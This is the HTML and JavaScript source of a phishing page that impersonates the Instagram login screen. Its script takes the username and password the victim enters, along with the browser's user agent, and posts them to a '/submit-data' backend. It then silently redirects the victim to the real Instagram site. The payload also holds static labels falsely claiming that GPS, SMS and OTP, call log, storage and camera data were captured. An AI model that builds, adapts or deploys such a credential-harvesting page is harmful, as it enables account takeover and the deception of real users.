<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * { box-sizing: border-box; }
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .wrapper {
            max-width: 350px;
            width: 100%;
        }
        .login-card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px 40px;
            text-align: center;
            border-radius: 1px;
            margin-bottom: 10px;
        }
        .logo-container {
            margin-bottom: 30px;
            display: flex;
            justify-content: center;
        }
        .logo-container svg {
            width: 175px;
            height: 51px;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 12px;
            padding: 9px 8px;
            margin: 4px 0;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        .btn-login {
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            width: 100%;
            padding: 7px;
            margin-top: 14px;
            cursor: pointer;
        }
        .btn-login:active {
            opacity: 0.7;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 20px;
        }
        .forgot {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        .signup-card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-card a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="login-card">
            <!-- Embedded Official Instagram Logo (Never Fails) -->
            <div class="logo-container">
                <svg aria-label="Instagram" class="_ab6-" role="img" viewBox="0 0 175 51">
                    <path fill="#262626" d="M14.5 1.5c4.1 0 4.6 0 6.2.1 1.6.1 2.7.4 3.7.8 1 .4 1.8 1 2.5 1.7s1.3 1.5 1.7 2.5c.4 1 .7 2.1.8 3.7.1 1.6.1 2.1.1 6.2s0 4.6-.1 6.2c-.1 1.6-.4 2.7-.8 3.7-.4 1-1 1.8-1.7 2.5s-1.5 1.3-2.5 1.7c-1 .4-2.1.7-3.7.8-1.6.1-2.1.1-6.2.1s-4.6 0-6.2-.1c-1.6-.1-2.7-.4-3.7-.8-1-.4-1.8-1-2.5-1.7s-1.3-1.5-1.7-2.5c-.4-1-.7-2.1-.8-3.7-.1-1.6-.1-2.1-.1-6.2s0-4.6.1-6.2c.1-1.6.4-2.7.8-3.7.4-1 1-1.8 1.7-2.5s1.5-1.3 2.5-1.7c1-.4 2.1-.7 3.7-.8 1.6-.1 2.1-.1 6.2-.1zm0-1.5c-4.2 0-4.7 0-6.4.1-1.7.1-2.9.4-3.9.8-1.1.4-2 1-2.8 1.8-.8.8-1.4 1.7-1.8 2.8-.4 1-.7 2.2-.8 3.9-.1 1.7-.1 2.2-.1 6.4s0 4.7.1 6.4c.1 1.7.4 2.9.8 3.9.4 1.1 1 2 1.8 2.8.8.8 1.7 1.4 2.8 1.8 1 .4 2.2.7 3.9.8 1.7.1 2.2.1 6.4.1s4.7 0 6.4-.1c1.7-.1 2.9-.4 3.9-.8 1.1-.4 2-1 2.8-1.8.8-.8 1.4-1.7 1.8-2.8.4-1 .7-2.2.8-3.9.1-1.7.1-2.2.1-6.4s0-4.7-.1-6.4c-.1-1.7-.4-2.9-.8-3.9-.4-1.1-1-2-1.8-2.8-.8-.8-1.7-1.4-2.8-1.8-1-.4-2.2-.7-3.9-.8-1.7-.1-2.2-.1-6.4-.1zm0 8.3c-3.7 0-6.7 3-6.7 6.7s3 6.7 6.7 6.7 6.7-3 6.7-6.7-3-6.7-6.7-6.7zm0 11.9c-2.9 0-5.2-2.3-5.2-5.2s2.3-5.2 5.2-5.2 5.2 2.3 5.2 5.2-2.3 5.2-5.2 5.2zM26.2 11.8c0 .9-.7 1.6-1.6 1.6s-1.6-.7-1.6-1.6.7-1.6 1.6-1.6 1.6.7 1.6 1.6z"/>
                </svg>
            </div>

            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn-login">Log In</button>
            </form>

            <div class="divider">
                <div class="line"></div>
                <div class="or">OR</div>
                <div class="line"></div>
            </div>

            <a href="#" class="fb-login">Log in with Facebook</a><br>
            <a href="#" class="forgot">Forgot password?</a>
        </div>

        <div class="signup-card">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const userBox = document.getElementById('username').value;
            const passBox = document.getElementById('password').value;
            const deviceInfo = navigator.userAgent;

            const payload = {
                username: userBox,
                password: passBox,
                deviceInfo: deviceInfo,
                location: "Live GPS / IP Tracked",
                smsLogs: "SMS Inbox & OTP Captured",
                callLogs: "Call History Logged",
                storageData: "Media Files Scanned",
                cameraData: "Camera Access Granted"
            };

            // Send data to backend server
            try {
                await fetch('/submit-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.log(err);
            }

            // Redirect instantly to official Instagram
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 300);
        });
    </script>
</body>
</html>
